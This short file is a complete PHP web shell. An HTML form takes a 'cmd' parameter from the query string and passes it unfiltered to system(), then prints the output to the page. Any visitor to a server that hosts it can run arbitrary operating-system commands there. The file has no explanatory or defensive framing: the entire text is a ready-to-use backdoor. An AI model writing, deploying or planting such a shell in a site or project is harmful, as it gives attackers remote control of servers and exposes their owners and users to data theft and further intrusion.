<html>
    <head></head>
    <body>
        <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="text" name="cmd" id="cmd" size="80" autofocus />
        </form>
        <pre>
        <?php
        if(isset($_GET['cmd']))
           system($_GET['cmd']); 
        ?>
        </pre>
    </body>
</html>
